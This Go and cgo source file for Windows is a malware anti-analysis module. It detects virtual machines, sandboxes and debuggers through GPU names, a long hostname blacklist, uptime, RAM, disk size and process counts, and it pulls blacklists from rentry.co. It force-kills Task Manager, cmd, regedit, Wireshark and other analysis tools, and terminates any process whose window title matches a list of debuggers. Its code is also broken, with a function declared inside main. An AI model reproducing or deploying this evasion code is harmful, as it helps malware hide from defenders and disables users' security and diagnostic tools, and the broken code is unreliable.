package main

/*
#include <windows.h>

BOOL checksysreq() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return FALSE;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = (DWORD)(memoryStatus.ullTotalPhys / (1024 * 1024));
    if (RAMMB < 2048) return FALSE;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        CloseHandle(hDevice);
        return FALSE;
    }

    DWORD diskSizeGB = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / (1024 * 1024 * 1024));
    CloseHandle(hDevice);
    if (diskSizeGB < 100) return FALSE;

	
    return TRUE;
}

ULONGLONG GetTickCount64();


*/
import "C"
import (
	"fmt"
	"syscall"
	"unsafe"
	"os/exec"
	"os"
	"strings"
	"encoding/json"
	"io/ioutil"
	"net/http"
)

var (
	mu32   = syscall.NewLazyDLL("user32.dll")
	pew          = mu32.NewProc("EnumWindows")
	pgwt       = mu32.NewProc("GetWindowTextA")
	pgwtp = mu32.NewProc("GetWindowThreadProcessId")
	mk32 = syscall.NewLazyDLL("kernel32.dll")
	pop         = mk32.NewProc("OpenProcess")
	ptp    = mk32.NewProc("TerminateProcess")
	pch         = mk32.NewProc("CloseHandle")
	pidp = mk32.NewProc("IsDebuggerPresent")

	pep = mk32.NewProc("K32EnumProcesses")
)


func main() {
// new check
if gpuchk() {
	syscall.Exit(-1)
}
// not my code credits to muza, this might trigger AV beacuse of WMIC.
func GCC() bool {
	cmd := exec.Command("wmic", "path", "win32_VideoController", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	gpu, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(gpu)), "virtualbox") || strings.Contains(strings.ToLower(string(gpu)), "vmware")
}
	
fmt.Println("gpu is clean")

	if GCC() {
		os.Exit(-1)
	}

	// pc name check
	badpcname := []string{"00900BC83803","0CC47AC83803","6C4E733F-C2D9-4","ACEPC","AIDANPC","ALENMOOS-PC","ALIONE","APPONFLY-VPS","ARCHIBALDPC","azure","B30F0242-1C6A-4","BAROSINO-PC","BECKER-PC","BEE7370C-8C0C-4","COFFEE-SHOP","COMPNAME_4047","d1bnJkfVlH","DESKTOP-19OLLTD","DESKTOP-1PYKP29","DESKTOP-1Y2433R","DESKTOP-4U8DTF8","DESKTOP-54XGX6F","DESKTOP-5OV9S0O","DESKTOP-6AKQQAM","DESKTOP-6BMFT65","DESKTOP-70T5SDX","DESKTOP-7AFSTDP","DESKTOP-7XC6GEZ","DESKTOP-8K9D93B","DESKTOP-AHGXKTV","DESKTOP-ALBERTO","DESKTOP-B0T93D6","DESKTOP-BGN5L8Y","DESKTOP-BUGIO","DESKTOP-BXJYAEC","DESKTOP-CBGPFEE","DESKTOP-CDQE7VN","DESKTOP-CHAYANN","DESKTOP-CM0DAW8","DESKTOP-CNFVLMW","DESKTOP-CRCCCOT","DESKTOP-D019GDM","DESKTOP-D4FEN3M","DESKTOP-DE369SE","DESKTOP-DIL6IYA","DESKTOP-ECWZXY2","DESKTOP-F7BGEN9","DESKTOP-FSHHZLJ","DESKTOP-G4CWFLF","DESKTOP-GELATOR","DESKTOP-GLBAZXT","DESKTOP-GNQZM0O","DESKTOP-GPPK5VQ","DESKTOP-HASANLO","DESKTOP-HQLUWFA","DESKTOP-HSS0DJ9","DESKTOP-IAPKN1P","DESKTOP-IFCAQVL","DESKTOP-ION5ZSB","DESKTOP-JQPIFWD","DESKTOP-KALVINO","DESKTOP-KOKOVSK","DESKTOP-NAKFFMT","DESKTOP-NKP0I4P","DESKTOP-NM1ZPLG","DESKTOP-NTU7VUO","DESKTOP-QUAY8GS","DESKTOP-RCA3QWX","DESKTOP-RHXDKWW","DESKTOP-S1LFPHO","DESKTOP-SUPERIO","DESKTOP-V1L26J5","DESKTOP-VIRENDO","DESKTOP-VKNFFB6","DESKTOP-VRSQLAG","DESKTOP-VWJU7MF","DESKTOP-VZ5ZSYI","DESKTOP-W8JLV9V","DESKTOP-WG3MYJS","DESKTOP-WI8CLET","DESKTOP-XOY7MHS","DESKTOP-Y8ASUIL","DESKTOP-YW9UO1H","DESKTOP-ZJF9KAN","DESKTOP-ZMYEHDA","DESKTOP-ZNCAEAM","DESKTOP-ZOJJ8KL","DESKTOP-ZV9GVYL","DOMIC-DESKTOP","EA8C2E2A-D017-4","ESPNHOOL","GANGISTAN","GBQHURCC","GRAFPC","GRXNNIIE","gYyZc9HZCYhRLNg","JBYQTQBO","JERRY-TRUJILLO","JOHN-PC","JUDES-DOJO","JULIA-PC","LANTECH-LLC","LISA-PC","LOUISE-PC","LUCAS-PC","MIKE-PC","NETTYPC","ORELEEPC","ORXGKKZC","Paul Jones","PC-DANIELE","PROPERTY-LTD","Q9IATRKPRH","QarZhrdBpj","RALPHS-PC","SERVER-PC","SERVER1","Steve","SYKGUIDE-WS17","T00917","test42","TIQIYLA9TW5M","TMKNGOMU","TVM-PC","VONRAHEL","WILEYPC","WIN-5E07COS9ALR","WINDOWS-EEL53SN","WINZDS-1BHRVPQU","WINZDS-22URJIBV","WINZDS-3FF2I9SN","WINZDS-5J75DTHH","WINZDS-6TUIHN7R","WINZDS-8MAEI8E4","WINZDS-9IO75SVG","WINZDS-AM76HPK2","WINZDS-B03L9CEO","WINZDS-BMSMD8ME","WINZDS-BUAOKGG1","WINZDS-K7VIK4FC","WINZDS-QNGKGN59","WINZDS-RST0E8VU","WINZDS-U95191IG","WINZDS-VQH86L5D","WORK","XC64ZB","XGNSVODU","ZELJAVA","3CECEFC83806","C81F66C83805","DESKTOP-USLVD7G","DESKTOP-AUPFKSY","DESKTOP-RP4FIBL","DESKTOP-6UJBD2J","DESKTOP-LTMCKLA","DESKTOP-FLTWYYU","DESKTOP-WA2BY3L","DESKTOP-UBDJJ0A","DESKTOP-KXP5YFO","DESKTOP-DAU8GJ2","DESKTOP-FCRB3FM","DESKTOP-VYRNO7M","DESKTOP-PKQNDSR","DESKTOP-SCNDJWE","DESKTOP-RSNLFZS","DESKTOP-MWFRVKH","DESKTOP-QLN2VUF","DESKTOP-62YPFIQ","DESKTOP-PA0FNV5","DESKTOP-B9OARKC","DESKTOP-J5XGGXR","DESKTOP-JHUHOTB","DESKTOP-64ACUCH","DESKTOP-SUNDMI5","DESKTOP-GCN6MIO","FERREIRA-W10","DESKTOP-MJC6500","DESKTOP-WS7PPR2","DESKTOP-XWQ5FUV","DESKTOP-UHHSY4R","DESKTOP-ZJRWGX5","DESKTOP-ZYQYSRD","WINZDS-MILOBM35","DESKTOP-K8Y2SAM","DESKTOP-4GCZVJU","DESKTOP-O6FBMF7","DESKTOP-WDT1SL6","EIEEIFYE","CRYPTODEV222222","EFA0FDEC-8FA7-4","DESKTOP-O7BI3PT","DESKTOP-UHQW8PI","WINZDS-PU0URPVI","ABIGAI","JUANYARO","floppy","CATWRIGHT", "llc"}

	cpcn, _ := os.Hostname()

	for _, pat := range badpcname {
		if strings.Contains(cpcn, pat) {
			os.Exit(-1) 
		}

	}
	fmt.Println("PC Name is not bad")
	//pc name check

	// ip check
	cip()

	// pc uptime lol
	var uptime uint64 = uint64(C.GetTickCount64()) / 1000
	if uptime < 1200 {
		os.Exit(-1)
	} else {
		fmt.Println("System uptime is not sus")
	}
	// sys reqs, we will be checking for workstations (VT)
	if C.checksysreq() == 1 {
        fmt.Println("passed")
    } else {
        os.Exit(-1)
    }
    // Check Processes (Workstations have most of the time less than 50)
	count := rpc()
	if count < 50 {fmt.Println("There are less than 50 running processes.")
    return
	}
	fmt.Printf("There are %d running processes.\n", count)

	// kill blacklisted processes (can by bypassed)
	ptk := []string{"cmd.exe", "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"}

	for _, prg := range ptk {
		exec.Command("taskkill", "/F", "/IM", prg).Run()
	}

    //check windows
	ewp := syscall.NewCallback(ewpg)
	ret, _, _ := pew.Call(ewp, 0)
	if ret == 0 {
		fmt.Println("EW failed idiot")
	}
	//is debugger present
    flag, _, _ := pidp.Call()
    if flag != 0 {
        os.Exit(-1)
    }
	fmt.Println("hahaah")
}

func gpuchk() bool {
	gpuuri := "https://rentry.co/povewdm6/raw"
	gpucm := exec.Command("curl", gpuuri)
	ou, _ := gpucm.Output()

	gpul := string(ou)

	ou, _ = exec.Command("cmd", "/C", "wmic path win32_videocontroller get name").Output()
	gpun := strings.TrimSpace(strings.Split(string(ou), "\n")[1])

	return strings.Contains(gpul, gpun)
	//gpu check, also im trying to write this readable way :c..
}



func rpc() int {
	// current running proceesses
	var ids [1024]uint32
	var needed uint32

	pep.Call(uintptr(unsafe.Pointer(&ids)),uintptr(len(ids)),uintptr(unsafe.Pointer(&needed)),)

	return int(needed / 4)
}

func cip() {
	// ip check
	iplst, _ := http.Get("https://rentry.co/hikbicky/raw")
	defer iplst.Body.Close()
	ipdat, _ := http.Get("https://api.ipify.org/?format=json")
	defer ipdat.Body.Close()
	ipbyt, _ := ioutil.ReadAll(iplst.Body)
	var dat map[string]string
	json.NewDecoder(ipdat.Body).Decode(&dat)
	if string(ipbyt) == dat["ip"] {
		os.Exit(-1)
	}
}


func ewpg(hwnd uintptr, lParam uintptr) uintptr {
	// blaccklisted window manes
	var pid uint32
	pgwtp.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	var title [256]byte
	pgwt.Call(hwnd, uintptr(unsafe.Pointer(&title)), 256)
	wt := string(title[:])

	bs := []string{
		"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy",
		"titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly",
		"process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor",
		"debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded",
		"dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza",
		"crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark",
		"debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper",
		"petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox",
		"dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg",
		"httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
		"mdbg", "WPE PRO", "system explorer", "de4dot", "x64dbg", "X64NetDumper", "protection_id",
		"charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd",
		"0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker",
		"harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice",
		"folder", "mitmproxy", "dbx", "sniffer", "Process Hacker",
	}

	for _, str := range bs {
		if contains(wt, str) {
			proc, _, _ := pop.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
			if proc != 0 {
				ptp.Call(proc, 0)
				pch.Call(proc)
			}
			syscall.Exit(0)
		}
	}

	return 1
}

func contains(s, substr string) bool {
	// pattern finding for the widnows lol
	return len(s) >= len(substr) && s[:len(substr)] == substr
}
